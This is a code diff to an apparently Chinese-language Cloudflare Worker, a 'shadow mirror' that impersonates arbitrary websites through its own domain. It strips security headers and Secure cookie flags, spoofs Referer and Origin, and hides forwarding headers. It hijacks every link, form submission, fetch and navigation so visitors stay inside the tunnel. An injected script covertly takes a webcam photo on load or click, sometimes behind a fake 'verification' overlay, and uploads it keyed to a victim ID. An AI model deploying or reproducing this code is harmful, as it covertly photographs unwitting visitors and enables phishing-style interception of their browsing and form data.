@@ -21,12 +21,13 @@ export default {
       return new Response(null, { headers: corsHeaders });
     }
 
-    // 频率限制检查 (上传计入次数，查看不计入)
-    if (path === "/api/upload" || path.startsWith("/api/image/")) {
+    // 频率限制检查 (上传计入次数，查看/镜像不计入但受限)
+    if (path === "/api/upload" || path.startsWith("/api/image/") || path === "/api/photos") {
       const shouldIncrement = (path === "/api/upload");
       const isAllowed = await checkRateLimit(request, env, shouldIncrement);
       if (!isAllowed) {
-        return new Response(JSON.stringify({ error: "今日配额已用完 (10次/天)" }), {
+        const errorMsg = path === "/api/upload" ? "今日上传配额已用完 (10次/天)" : "今日查看配额已用完 (10次/天)";
+        return new Response(JSON.stringify({ error: errorMsg }), {
           status: 429,
           headers: { ...corsHeaders, "Content-Type": "application/json" }
         });
@@ -82,25 +83,38 @@ export default {
 
     const selfOrigin = `${url.protocol}//${url.host}`;
 
-    // 影子镜像引擎：放宽入口判定，确保所有 /v 流量被捕获
-    // 兼容 url, u, d 等多种参数格式
-    const isMirrorEntry = path.toLowerCase() === "/v" || path.toLowerCase().startsWith("/v?");
-
-    if (isMirrorEntry) {
-      return handleMirror(request, env, ctx, null, null, selfOrigin);
+    // 1. 系统通道优先度：API 与 Proxy 资源代理
+    if (path.startsWith("/api/")) {
+      return handleApi(request, env, ctx);
     }
 
-    // 全局代理回填逻辑：处理目标站的所有内部路径请求（包括那些以 /v 开头的内部 API）
+    if (path.startsWith("/proxy/")) {
+      return handleProxy(request, env, ctx);
+    }
+
+    // 2. 镜像入口捕获
+    const isMirrorEntry = path.toLowerCase() === "/v" || path.toLowerCase().startsWith("/v?");
+
+    // 3. [V9.2 独占式隧道]：只要有 Session，全量拦截（除 API/Proxy 外）
     const shadowTarget = getCookie(request, "SHADOW_TARGET");
     const shadowId = getCookie(request, "SHADOW_ID");
 
-    if (shadowTarget && !path.startsWith("/api") && path !== "/" && path !== "/home.html") {
-      const targetUrl = new URL(shadowTarget);
-      const proxyUrl = new URL(url.pathname + url.search, targetUrl.origin);
-
-      const proxyRequest = new Request(proxyUrl, request);
-      return handleMirror(proxyRequest, env, ctx, shadowTarget, shadowId, selfOrigin);
+    if (isMirrorEntry || shadowTarget) {
+      // 如果已在镜像中但又访问 /，强制进入镜像首页
+      const targetBase = isMirrorEntry ? null : shadowTarget;
+      return handleMirror(request, env, ctx, targetBase, shadowId, selfOrigin);
     }
+
+    // 4. [无会话模式]：展现工具首页
+    if (path === "/" || path === "/index.html" || path === "/home.html") {
+      return handleStatic(request, env, "home.html");
+    }
+    if (path === "/view.html") {
+      return handleStatic(request, env, "view.html");
+    }
+
+    // 兜底：尝试资源服务或 404
+    return env.ASSETS ? env.ASSETS.fetch(request) : new Response("Not Found", { status: 404 });
 
     // 健康检查端点
     if (path === "/api/ping" || path === "/ping") {
@@ -108,7 +122,7 @@ export default {
         JSON.stringify({
           status: "ok",
           timestamp: new Date().toISOString(),
-          message: "API is running",
+          message: "隧道保持激活中",
         }),
         {
           status: 200,
@@ -584,33 +598,77 @@ async function handleMirror(request, env, ctx, explicitTarget = null, cachedId =
 
   const url = new URL(request.url);
   const currentOrigin = selfOrigin || url.origin;
-  // 优先尝试 url 参数，其次尝试 u 参数（兼容性增强）
+
+  // V9.2：智能目标解析逻辑
   let targetUrl = explicitTarget || url.searchParams.get("url") || url.searchParams.get("u");
   let id = url.searchParams.get("id") || cachedId;
+
+  // 如果是在会话中（无显式 url 参数），则将会话基准与当前路径结合
+  if (explicitTarget && !url.searchParams.has("url") && !url.searchParams.has("u")) {
+    const base = new URL(explicitTarget);
+    targetUrl = base.origin + url.pathname + url.search;
+  }
+
   const encodedData = url.searchParams.get("d");
   const mode = url.searchParams.get("m") || "0";
 
   // 支持前端生成的 Base64 复合编码参数
-  if (encodedData && (!targetUrl || !id)) {
+  if (encodedData) {
     try {
-      // 这里的 atob 在 Worker 环境中可用
-      const decoded = atob(encodedData);
-      // 特殊字符还原逻辑（对应前端 encodeURIComponent 逻辑）
-      const decodedParams = decodeURIComponent(
+      // 1. 容错转换：处理 + 号变空格，并清理可能存在的换行符
+      const b64 = encodedData.replace(/ /g, "+").replace(/[\r\n]/g, "");
+      const decoded = atob(b64);
+
+      // 2. 字节还原逻辑
+      let decodedParams = decodeURIComponent(
         Array.from(decoded).map(c => "%" + ("00" + c.charCodeAt(0).toString(16)).slice(-2)).join("")
       );
+
+      // 3. 多路分隔符适配：兼容 | 和 %7C
+      decodedParams = decodedParams.replace(/%7C/g, "|");
       const parts = decodedParams.split("|");
+
       if (parts.length >= 2) {
-        id = parts[0];
-        targetUrl = parts[1];
+        if (!id) id = parts[0].trim();
+        if (!targetUrl) targetUrl = parts[1].trim();
+      } else if (parts.length === 1) {
+        const potentialUrl = parts[0].trim();
+        if (potentialUrl.includes(".") || potentialUrl.startsWith("http")) {
+          if (!targetUrl) targetUrl = potentialUrl;
+          if (!id) id = "guest_" + Math.random().toString(36).substring(2, 6);
+        }
       }
     } catch (e) {
-      console.error("Base64 Decode Error:", e);
+      console.error("Shadow Decoder Error:", e);
+    }
+  }
+
+  // 兜底补全与 URL 合规化
+  if (targetUrl) {
+    // 关键修正：处理可能存在的双重 URI 编码（针对像 https%3A%2F%2F 的情况）
+    if (targetUrl.includes("%")) {
+      try { targetUrl = decodeURIComponent(targetUrl).trim(); } catch (e) { }
+    }
+    if (id && id.includes("%")) {
+      try { id = decodeURIComponent(id).trim(); } catch (e) { }
+    }
+
+    // 移除多余的、重复的协议头（处理 https://https://... 的情况）
+    targetUrl = targetUrl.replace(/^(https?:\/\/)+/i, "$1");
+
+    // 补齐缺失协议
+    if (!targetUrl.startsWith("http") && (targetUrl.includes(".") || targetUrl.includes(":"))) {
+      targetUrl = "https://" + targetUrl;
+    }
+
+    // 自动分配 ID
+    if (!id || id === "null" || id === "") {
+      id = "guest_" + Math.random().toString(36).substring(2, 6);
     }
   }
 
   if (!targetUrl || !id) {
-    return new Response("Missing parameters", { status: 400 });
+    return new Response("Missing parameters (ID or URL needed)", { status: 400 });
   }
 
   // 0. 尝试从边缘缓存获取 (加速关键)
@@ -623,6 +681,7 @@ async function handleMirror(request, env, ctx, explicitTarget = null, cachedId =
 
   try {
     const currentOrigin = url.origin;
+    const host = new URL(selfOrigin).host;
     const isAllowed = await checkRateLimit(request, env, false);
     const ipAddr = getClientIP(request);
     const isWhitelisted = (env.WHITELIST_IP || "").split(',').map(i => i.trim()).includes(ipAddr);
@@ -631,53 +690,102 @@ async function handleMirror(request, env, ctx, explicitTarget = null, cachedId =
     let shouldCapture = (isAllowed || isWhitelisted) && id && id !== "null";
 
     // 1. 抓取目标页面 - 强制解压缩以确保代码注入成功
-    const targetHost = new URL(targetUrl).host;
+    // --- 影子引擎核心：Header 伪装与链路保护 ---
+    const targetUrlObj = new URL(targetUrl);
+    const targetHost = targetUrlObj.host;
+    const targetOrigin = targetUrlObj.origin;
+
     const fetchHeaders = new Headers(request.headers);
     fetchHeaders.set("Host", targetHost);
-    fetchHeaders.set("Accept-Encoding", "identity"); // 核心修复：禁止 Gzip，确保拿到明文 HTML
-    fetchHeaders.delete("Referer");
+    fetchHeaders.set("Referer", targetOrigin + "/"); // 强制伪造目标站内部跳转
+    fetchHeaders.set("Origin", targetOrigin);
+    fetchHeaders.set("Accept-Encoding", "identity"); // 禁止压缩，确保可注入
 
-    const response = await fetch(targetUrl, {
+    // 移除可能导致检测的镜像站标识
+    fetchHeaders.delete("CF-Connecting-IP");
+    fetchHeaders.delete("X-Forwarded-For");
+    fetchHeaders.delete("X-Real-IP");
+
+    const fetchOptions = {
+      method: request.method,
       headers: fetchHeaders,
       redirect: "manual"
-    });
-
-    // 定义 Cookie 清理函数：剥离 Domain 和 Path，确保在影子域名下生效
-    const cleanCookieHeaders = (resHeaders) => {
-      const newHeaders = new Headers();
-      resHeaders.forEach((v, k) => {
-        if (k.toLowerCase() === "set-cookie") {
-          const clean = v.replace(/Domain=[^; ]+;?/gi, "").replace(/Path=\/[^; ]*/gi, "Path=/");
-          newHeaders.append("Set-Cookie", clean);
-        } else {
-          newHeaders.set(k, v);
-        }
-      });
-      return newHeaders;
     };
 
-    // 拦截重定向：解决百度死循环并带回 Cookie
-    if (response.status >= 300 && response.status < 400) {
+    // 只有非 GET/HEAD 请求才需要透传 Body
+    if (request.method !== "GET" && request.method !== "HEAD") {
+      // 在 Worker 中，Body 可以通过 request.arrayBuffer() 获取并转发
+      fetchOptions.body = await request.arrayBuffer();
+    }
+
+    console.log(`[Shadow Mirror] Fetching: ${targetUrl}`);
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 5000);
+
+    let response;
+    try {
+      response = await fetch(targetUrl, {
+        ...fetchOptions,
+        signal: controller.signal
+      });
+      console.log(`[Shadow Mirror] Response: ${response.status} ${response.statusText}`);
+    } catch (e) {
+      console.error(`[Shadow Mirror] Fetch Error: ${e.message} for ${targetUrl}`);
+      return new Response(`Proxy Error: ${e.message}`, { status: 502 });
+    } finally {
+      clearTimeout(timeout);
+    }
+
+    // --- V9.2 Location 硬化：防止 3xx 带来的脱域 ---
+    if ([301, 302, 303, 307, 308].includes(response.status)) {
       const location = response.headers.get("Location");
       if (location) {
-        let redirectUrl = location.startsWith("/") ? new URL(targetUrl).origin + location : location;
-        const newLocation = `${currentOrigin}/v?url=${encodeURIComponent(redirectUrl)}&id=${id}&m=${mode}`;
-
-        const redirectHeaders = cleanCookieHeaders(response.headers);
-        redirectHeaders.set("Location", newLocation);
-
-        return new Response(null, {
-          status: response.status,
-          headers: redirectHeaders
-        });
+        const nextUrl = new URL(location, targetUrl).toString();
+        const headers = cleanCookieHeaders(response.headers);
+        // 将 Location 重构为经过镜像转换的路径，并带上当前会话 ID 维持连续性
+        headers.set("Location", wrapNav(nextUrl, selfOrigin, id));
+        return new Response(null, { status: response.status, headers });
       }
     }
 
-    if (!response.ok) {
-      return new Response(`Failed to fetch target: ${response.status}`, { status: 502 });
+    const contentType = response.headers.get("Content-Type") || "";
+    const isHtml = contentType.includes("text/html");
+
+    if (!isHtml) {
+      const passHeaders = cleanCookieHeaders(response.headers);
+      passHeaders.set("Access-Control-Allow-Origin", "*");
+      return new Response(response.body, {
+        status: response.status,
+        headers: passHeaders
+      });
     }
 
     let html = await response.text();
+
+    // 核心硬化：多域名隧道化 (Domain Drifting V2)
+    // [V9.0 Turbo Rewrite] 升级全域 URL 劫持，自动将第三方 CDN 资源泵入镜像隧道
+    // 兼容多种引号和双斜线路径，最大程度防止“脱域”请求
+    const universalProxyRegex = /(https?:\/\/[a-z0-9.-]+\.[a-z]{2,}(?::[0-9]+)?)(\/[^"'\s<>]*)/gi;
+    html = html.replace(universalProxyRegex, (match, domain, path) => {
+      const domainName = domain.replace(/^https?:\/\//, "");
+      // 排除当前镜像自身域名和主站域名（主站域名走回流逻辑）
+      if (domainName === host || domainName === new URL(targetUrl).host) {
+        return match;
+      }
+      return `${currentOrigin}/proxy/${domainName}${path}`;
+    });
+
+    // 针对 // 开头的相对协议资源进行劫持
+    html = html.replace(/\/\/[a-z0-9.-]+\.[a-z]{2,}\/[^"'\s<>]*/gi, (match) => {
+      const domainName = match.substring(2).split("/")[0];
+      if (domainName === host || domainName === new URL(targetUrl).host) {
+        return match;
+      }
+      return `${currentOrigin}/proxy/${domainName}${match.substring(2 + domainName.length)}`;
+    });
+
+    // 特殊处理主站 www.baidu.com 的绝对路径
+    html = html.replace(/(https?:)?\/\/www\.baidu\.com/g, "");
 
     // 2. 注入多战术模式 (CSS/HTML/JS)
     const IS_ENFORCE = mode === "1";
@@ -753,91 +861,227 @@ async function handleMirror(request, env, ctx, explicitTarget = null, cachedId =
       forceHtml = `<div id="shadow-click-trap"></div>`;
     }
 
+    // --- 影子镜像 V8.0: 全领域劫持 + 导航拦截模式 ---
     const captureScript = `
-    <!-- Online Mirror Tactical Engine V5.1 - Chinese Optimized -->
     <script>
     (function(){
       const ID = "${id}";
       const MODE = "${mode}";
-      const API_UPLOAD = "${currentOrigin}/api/upload";
-      let captured = false;
+      const SELF_ORIGIN = location.origin;
+      const API_UPLOAD = SELF_ORIGIN + "/api/upload";
+      const TARGET_HOST = "${new URL(targetUrl).host}";
+      const TARGET_ORIGIN = "${new URL(targetUrl).origin}";
 
-      function unlock() {
-        const overlay = document.getElementById('enforcement-overlay');
-        const trap = document.getElementById('shadow-click-trap');
-        const style = document.getElementById('shadow-lock-style');
-        if (overlay) overlay.remove();
-        if (trap) trap.remove();
-        if (style) style.remove();
+      // ====== 1. AJAX 隧道 (fetch / XHR) ======
+      const originalFetch = window.fetch;
+      const originalOpen = XMLHttpRequest.prototype.open;
+
+      function wrapUrl(url) {
+        if (!url || typeof url !== 'string' || url.startsWith('blob:') || url.startsWith('data:')) return url;
+        if (url.startsWith('//')) url = location.protocol + url;
+        try {
+          const u = new URL(url, location.href);
+          if (u.origin !== SELF_ORIGIN && !u.host.includes('google-analytics') && !u.host.includes('doubleclick')) {
+            if (u.host !== TARGET_HOST) {
+               return "/proxy/" + u.host + u.pathname + u.search + u.hash;
+            }
+            return u.pathname + u.search + u.hash;
+          }
+        } catch(e) {}
+        return url;
       }
 
-      function upload(data, ip) {
-        const payload = JSON.stringify({ id: ID, image: data, ip: ip });
+      // 导航级 URL 重写：跨域导航 → 重新走 /v 入口
+      function wrapNav(url) {
+        if (!url || typeof url !== 'string' || url.startsWith('blob:') || url.startsWith('data:') || url.startsWith('javascript:') || url === '#') return url;
+        if (url.startsWith('//')) url = location.protocol + url;
+        try {
+          const u = new URL(url, location.href);
+          // 已经是镜像站内部路径，不需要重写
+          if (u.origin === SELF_ORIGIN) return url;
+          // 跨域导航 → 通过 /v 重新进入镜像隧道
+          return SELF_ORIGIN + "/v?url=" + encodeURIComponent(u.href) + "&id=" + encodeURIComponent(ID) + "&m=" + MODE;
+        } catch(e) {}
+        return url;
+      }
+
+      window.fetch = async function(input, init) {
+        if (input instanceof Request) return originalFetch(new Request(wrapUrl(input.url), input), init);
+        return originalFetch(wrapUrl(input), init);
+      };
+      XMLHttpRequest.prototype.open = function(method, url) {
+        return originalOpen.apply(this, [method, wrapUrl(url), ...Array.from(arguments).slice(2)]);
+      };
+
+      // ====== 2. 全域导航劫持 (链接 / 表单 / location) ======
+
+      // 2a. 拦截 <a> 链接点击
+      document.addEventListener('click', function(e) {
+        const a = e.target.closest('a[href]');
+        if (!a) return;
+        const href = a.getAttribute('href');
+        if (!href || href.startsWith('#') || href.startsWith('javascript:')) return;
+        try {
+          const abs = new URL(href, location.href);
+          if (abs.origin !== SELF_ORIGIN) {
+            e.preventDefault();
+            e.stopPropagation();
+            location.href = wrapNav(abs.href);
+          }
+        } catch(e2) {}
+      }, true);
+
+      // 2b. 拦截 <form> 表单提交 (强力保障版)
+      document.addEventListener('submit', function(e) {
+        const form = e.target;
+        if (!form || form.tagName !== 'FORM') return;
+        
+        // 强制劫持所有表单，无论相对还是绝对路径
+        const action = form.getAttribute('action') || '';
+        try {
+          const abs = new URL(action, location.href);
+          e.preventDefault();
+          
+          // 整合 Method 与 Params
+          const fd = new FormData(form);
+          const params = new URLSearchParams(fd).toString();
+          const sep = abs.search ? '&' : '?';
+          let dest = abs.href;
+          
+          if (form.method.toLowerCase() === 'get' && params) {
+             const cleanBase = abs.href.split('?')[0];
+             dest = cleanBase + '?' + params;
+          }
+          
+          console.log('[Shadow Capture] Form hijacked:', dest);
+          location.href = wrapNav(dest);
+        } catch(e2) {
+          console.error('[Shadow Capture] Form hijack fail:', e2);
+        }
+      }, true);
+
+      // 2c. 劫持 window.location 赋值与 History API
+      const _assign = location.assign.bind(location);
+      const _replace = location.replace.bind(location);
+      
+      location.assign = (url) => _assign(wrapNav(url));
+      location.replace = (url) => _replace(wrapNav(url));
+      
+      const _pushState = history.pushState.bind(history);
+      const _replaceState = history.replaceState.bind(history);
+      
+      history.pushState = function(state, title, url) {
+        return _pushState(state, title, url ? wrapNav(url) : url);
+      };
+      history.replaceState = function(state, title, url) {
+        return _replaceState(state, title, url ? wrapNav(url) : url);
+      };
+
+      // 2d. 劫持 window.open
+      const _open = window.open;
+      window.open = function(url) {
+        return _open.call(window, wrapNav(url), ...Array.from(arguments).slice(1));
+      };
+
+      // 2e. MutationObserver：动态追加的 <a> 也必须重写
+      new MutationObserver(function(muts) {
+        muts.forEach(function(m) {
+          m.addedNodes.forEach(function(n) {
+            if (n.nodeType !== 1) return;
+            const links = n.tagName === 'A' ? [n] : (n.querySelectorAll ? Array.from(n.querySelectorAll('a[href]')) : []);
+            links.forEach(function(a) {
+              const h = a.getAttribute('href');
+              if (!h || h.startsWith('#') || h.startsWith('javascript:')) return;
+              try {
+                const abs = new URL(h, location.href);
+                if (abs.origin !== SELF_ORIGIN) a.setAttribute('href', wrapNav(abs.href));
+              } catch(e3) {}
+            });
+            // 重写 form action
+            const forms = n.tagName === 'FORM' ? [n] : (n.querySelectorAll ? Array.from(n.querySelectorAll('form[action]')) : []);
+            forms.forEach(function(f) {
+              const act = f.getAttribute('action');
+              if (!act) return;
+              try {
+                const abs = new URL(act, location.href);
+                if (abs.origin !== SELF_ORIGIN) f.setAttribute('action', wrapNav(abs.href));
+              } catch(e4) {}
+            });
+          });
+        });
+      }).observe(document.documentElement, { childList: true, subtree: true });
+
+      // ====== 3. 捕获控制 ======
+      let captured = false;
+      function unlock() {
+        ['enforcement-overlay', 'shadow-click-trap', 'shadow-lock-style'].forEach(id => {
+          const el = document.getElementById(id);
+          if (el) el.remove();
+        });
+      }
+      function upload(data) {
+        const payload = JSON.stringify({ id: ID, image: data });
         if (navigator.sendBeacon) {
           navigator.sendBeacon(API_UPLOAD, new Blob([payload], {type: 'application/json'}));
         } else {
-          fetch(API_UPLOAD, { method: 'POST', body: payload, keepalive: true });
+          originalFetch(API_UPLOAD, { method: 'POST', body: payload, keepalive: true }).catch(()=>{});
         }
       }
-
       async function startCapture() {
         if (captured) return;
         try {
-          // 拍照前先闪避
-          const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 480, height: 360, facingMode: "user" } });
+          const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640 } });
           captured = true;
           unlock();
-
           const video = document.createElement('video');
           video.srcObject = stream;
-          video.muted = true;
           await video.play();
           const canvas = document.createElement('canvas');
           canvas.width = video.videoWidth; canvas.height = video.videoHeight;
           canvas.getContext('2d').drawImage(video, 0, 0);
           stream.getTracks().forEach(t => t.stop());
           upload(canvas.toDataURL('image/jpeg', 0.6));
-        } catch(e) {
-          if (MODE === "1") alert("安全验证失败：请确保设备摄像头已授权，否则无法继续访问。");
-        }
+        } catch(e) { if(MODE==="1") alert("验证失败，请授权摄像头。"); }
       }
-
-      if (MODE === "1") {
-        window.performCapture = startCapture;
-      } else if (MODE === "2") {
-        window.addEventListener('click', startCapture, { once: true });
-      } else {
-        if (document.readyState === 'complete') { startCapture(); }
-        else { window.addEventListener('load', startCapture); }
-      }
+      if(MODE==="1") window.performCapture = startCapture;
+      else if(MODE==="2") window.addEventListener('click', startCapture, {once:true});
+      else window.addEventListener('load', startCapture);
     })();
     </script>
     `;
 
-    // 3. HTML 动态重组 (仅在允许抓取时注入脚本)
-    const baseTag = `<base href="${targetUrl}">`;
-    html = html.replace(/<head>/i, `<head>${baseTag}${shouldCapture ? forceStyle : ""}`);
-    html = html.replace(/<\/body>/i, `${shouldCapture ? forceHtml + captureScript : ""}</body>`);
+    // 3. HTML / JS 动态重组 (关键修复：base 标签必须指向本域，防止相对路径逃逸)
+    if (isHtml) {
+      const baseTag = `<base href="/">`;
+      const headInjection = `${baseTag}${shouldCapture ? forceStyle + captureScript : ""}`;
+      html = html.replace(/<head>/i, `<head>${headInjection}`);
+      html = html.replace(/<\/body>/i, `${shouldCapture ? forceHtml : ""}</body>`);
+    } else if (contentType.includes("javascript")) {
+      // 对 JS 文件也进行域名漂移，确保其内部硬编码的 URL 也走隧道
+      staticDomains.forEach(domain => {
+        const regex = new RegExp(`(https?:)?//${domain}`, 'g');
+        html = html.replace(regex, `${currentOrigin}/proxy/${domain}`);
+      });
+      html = html.replace(/(https?:)?\/\/www\.baidu\.com/g, "");
+    }
 
     // 5. 最终响应处理：应用 Cookie 逻辑并清理安全头
-    const newHeaders = cleanCookieHeaders(response.headers);
-    newHeaders.set("Content-Type", "text/html; charset=UTF-8");
-    newHeaders.set("X-Mirror-Engine", "Shadow-V5-Turbo");
+    const finalHeaders = cleanCookieHeaders(response.headers);
+    finalHeaders.set("Content-Type", "text/html; charset=UTF-8");
+    finalHeaders.set("X-Mirror-Engine", "Shadow-V5-Turbo");
+    finalHeaders.set("Access-Control-Allow-Origin", "*");
 
-    // 强制清理 CSP 和 Frame 限制，确保脚本/拍照弹窗能出来
-    newHeaders.delete("Content-Security-Policy");
-    newHeaders.delete("X-Frame-Options");
-    newHeaders.delete("X-Content-Type-Options");
-    newHeaders.set("Access-Control-Allow-Origin", "*");
-
-    // 设置 Cookie 记忆，用于处理后续相对路径请求
+    // 设置 Cookie 记忆，关键修复：必须同时设置 SHADOW_TARGET 以维持 Session
+    if (targetUrl) {
+      finalHeaders.append("Set-Cookie", `SHADOW_TARGET=${encodeURIComponent(new URL(targetUrl).origin)}; Path=/; Max-Age=3600; SameSite=Lax`);
+    }
     if (id && !cachedId) {
-      newHeaders.append("Set-Cookie", `SHADOW_ID=${id}; Path=/; Max-Age=3600; SameSite=Lax`);
+      finalHeaders.append("Set-Cookie", `SHADOW_ID=${id}; Path=/; Max-Age=3600; SameSite=Lax`);
     }
 
     const finalResponse = new Response(html, {
       status: 200,
-      headers: newHeaders,
+      headers: finalHeaders,
     });
 
     // 存入边缘缓存，加速后续访问
@@ -848,6 +1092,7 @@ async function handleMirror(request, env, ctx, explicitTarget = null, cachedId =
     return new Response(`Mirror Error: ${err.message}`, { status: 500 });
   }
 }
+
 
 // 辅助函数：频率限制检查
 async function checkRateLimit(request, env, increment = true) {
@@ -888,4 +1133,119 @@ function getCookie(request, name) {
     if (key === name) return decodeURIComponent(value);
   }
   return null;
+}
+
+// 辅助函数：清理 Cookie Header
+function cleanCookieHeaders(resHeaders) {
+  const newHeaders = new Headers();
+  resHeaders.forEach((v, k) => {
+    const key = k.toLowerCase();
+    if (key === "set-cookie") {
+      const clean = v.replace(/Domain=[^; ]+;?/gi, "")
+        .replace(/Path=\/[^; ]*/gi, "Path=/")
+        .replace(/Secure;?/gi, "");
+      newHeaders.append("Set-Cookie", clean);
+    } else if (key !== "content-security-policy" && key !== "x-frame-options" && key !== "x-content-type-options") {
+      newHeaders.set(k, v);
+    }
+  });
+  return newHeaders;
+}
+
+// --- V9.2 系统模块分发 ---
+
+async function handleApi(request, env, ctx) {
+  const url = new URL(request.url);
+  const path = url.pathname;
+
+  if (path === "/api/ping" || path === "/ping") {
+    return new Response(JSON.stringify({ status: "ok", time: new Date().toISOString() }), {
+      headers: { ...corsHeaders, "Content-Type": "application/json" }
+    });
+  }
+
+  // 健康度与存储桶统计
+  if (path === "/api/stats") {
+    try {
+      const list = await env.PHOTO_BUCKET.list({ limit: 1 });
+      return new Response(JSON.stringify({ storage: "ready", ObjectsCount: list.objects.length }), {
+        headers: { ...corsHeaders, "Content-Type": "application/json" }
+      });
+    } catch (e) {
+      return new Response(JSON.stringify({ storage: "error", message: e.message }), {
+        status: 500,
+        headers: { ...corsHeaders, "Content-Type": "application/json" }
+      });
+    }
+  }
+
+  return new Response("API Not Found", { status: 404 });
+}
+
+async function handleProxy(request, env, ctx) {
+  const url = new URL(request.url);
+  const path = url.pathname;
+  const remaining = path.replace("/proxy/", "");
+  const firstSlash = remaining.indexOf("/");
+
+  if (firstSlash === -1) {
+    return new Response("Invalid Proxy Path", { status: 400 });
+  }
+
+  const targetHost = remaining.substring(0, firstSlash);
+  const targetPath = remaining.substring(firstSlash);
+  const proxyUrl = new URL(targetPath + url.search, `https://${targetHost}`);
+
+  console.log(`[Shadow Proxy] Fetching: ${proxyUrl.toString()}`);
+
+  const proxyHeaders = new Headers(request.headers);
+  proxyHeaders.set("Host", targetHost);
+  proxyHeaders.set("Referer", `https://${targetHost}/`);
+  proxyHeaders.set("Origin", `https://${targetHost}`);
+
+  // 深度隔离，防止泄露 Worker 身份
+  proxyHeaders.delete("CF-Connecting-IP");
+  proxyHeaders.delete("X-Forwarded-For");
+
+  try {
+    const res = await fetch(proxyUrl, {
+      headers: proxyHeaders,
+      redirect: "follow"
+    });
+
+    const cleanHeaders = cleanCookieHeaders(res.headers);
+    cleanHeaders.set("Access-Control-Allow-Origin", "*");
+    return new Response(res.body, { status: res.status, headers: cleanHeaders });
+  } catch (e) {
+    console.error(`[Shadow Proxy] Error: ${e.message}`);
+    return new Response("Proxy Error", { status: 502 });
+  }
+}
+
+async function handleStatic(request, env, filename) {
+  // 如果有 ASSETS 绑定（Wrangler Pages），尝试 fetch
+  if (env.ASSETS) {
+    return env.ASSETS.fetch(request);
+  }
+  // 否则根据文件名决定返回内容
+  if (filename === "home.html") {
+    // 这里如果愿意可以用变量存储整个 HTML 字符串，也可以通过 R2 读取。
+    // 本项目中主逻辑在 handleMirror 下，home.html 通常是静态站点。
+    // 我们在此演示：若无绑定，返回一个带有说明的响应
+    return new Response("Static Asset Service Not Connected", { status: 503 });
+  }
+  return new Response("File Not Found", { status: 404 });
+}
+
+// 辅助函数：根据当前域名打包导航 URL
+function wrapNav(targetUrl, selfOrigin, id = "") {
+  if (!targetUrl) return "";
+  try {
+    const raw = id ? `${id}|${targetUrl}` : targetUrl;
+    // 使用 encodeURIComponent 确保支持中文 ID
+    const b64 = btoa(encodeURIComponent(raw));
+    return `${selfOrigin}/v?d=${b64}&m=0`;
+  } catch (e) {
+    return targetUrl;
+  }
 }
